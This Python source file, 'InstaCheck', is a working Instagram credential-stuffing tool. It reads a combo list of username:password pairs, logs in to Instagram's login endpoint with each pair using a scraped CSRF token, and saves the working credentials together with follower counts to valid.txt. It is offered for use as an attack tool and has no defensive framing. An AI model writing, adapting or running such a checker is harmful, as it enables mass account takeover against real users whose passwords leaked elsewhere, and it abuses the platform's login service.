# Help by contributing, not by script kiddie
# Author : X - MrG3P5
# Version : 1.0

import requests, re, sys, pyfiglet, os
from datetime import datetime
from colorama import init, Fore

init()

# Color
resetC = Fore.RESET
LGreenC = Fore.LIGHTGREEN_EX
CyanC = Fore.CYAN
WhiteC = Fore.WHITE
RedC = Fore.RED

def banner():
    os.system('cls|clear')
    my_banner = pyfiglet.figlet_format('InstaCheck', font='slant', justify='center')
    print(f'{RedC}{my_banner}')
    print(f'{CyanC}\t\t\t[ {WhiteC}Created By X-MrG3P5 {CyanC}]\n')

def human_format(num):
    magnitude = 0
    while abs(num) >= 1000:
        magnitude += 1
        num /= 1000.0
    return '%.2f%s' % (num, ['', 'K', 'M', 'G', 'T', 'P'][magnitude])

def gas(_username, _password):
    time = int(datetime.now().timestamp())
    payload = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{_password}',
        'username': _username,
        'queryParams': {},
        'optIntoOneTap': 'false',
        'stopDeletionNonce': '',
        'trustedDeviceRecords': {}
    }
    s = requests.Session()
    r = s.get('https://www.instagram.com/')
    csrf_token = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]

    # Login & Check
    try:
        r = s.post('https://www.instagram.com/accounts/login/ajax/', data=payload, headers={
        'User-Agent': 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/',
        'X-CSRFToken': csrf_token
        })
        if r.json()['user'] == True and r.json()['status'] == 'ok' and r.json()['authenticated'] == True:
            live_mails = open('valid.txt', 'w')
            find_username_by_userId = requests.get(f"""https://i.instagram.com/api/v1/users/{r.json()['userId']}/info/""", headers={
            'User-Agent': 'Instagram 85.0.0.21.100 Android (23/6.0.1; 538dpi; 1440x2560; LGE; LG-E425f; vee3e; en_US'
            }).json()
            req_for_data = s.get(f"""https://www.instagram.com/{find_username_by_userId['user']['username']}/?__a=1""", headers={
             "Cookie": f"""mid={s.cookies.get_dict()['mid']}; ig_did={s.cookies.get_dict()['ig_did']}; ig_nrcb={s.cookies.get_dict()['ig_nrcb']}; csrftoken={s.cookies.get_dict()['csrftoken']}; ds_user_id={s.cookies.get_dict()['ds_user_id']}; sessionid={s.cookies.get_dict()['sessionid']};"""
            }).json()
            print(f"{CyanC}[ {LGreenC}Good {CyanC}] {WhiteC}{find_username_by_userId['user']['username']}:{_password} | Follower : {human_format(req_for_data['graphql']['user']['edge_followed_by']['count'])}")
            live_mails.write(f"{find_username_by_userId['user']['username']}:{_password} | Follower : {human_format(req_for_data['graphql']['user']['edge_followed_by']['count'])}\n")
        else:
            print(f"{CyanC}[ {RedC}BAD{CyanC} ] {WhiteC}{_username}:{_password}")
    except Exception as e:
        pass


if __name__=='__main__':
    banner()
    tanya_list = str(input(f'{CyanC}[{WhiteC}?{CyanC}] Masukin Comblo List Path (ex: combo.txt) : {WhiteC}'))
    if os.path.exists(tanya_list):
        open_combo = open(tanya_list, 'r')
        while True:
            email = open_combo.readline().replace('\n', '')
            if not email:
                break
            split_mail = email.strip().split(':')
            gas(split_mail[0], split_mail[1])
        print(f'{WhiteC} Successfully saved to {LGreenC}valid.txt{WhiteC}')
    else:
        print(f'{WhiteC}Filenya gak ada anj')
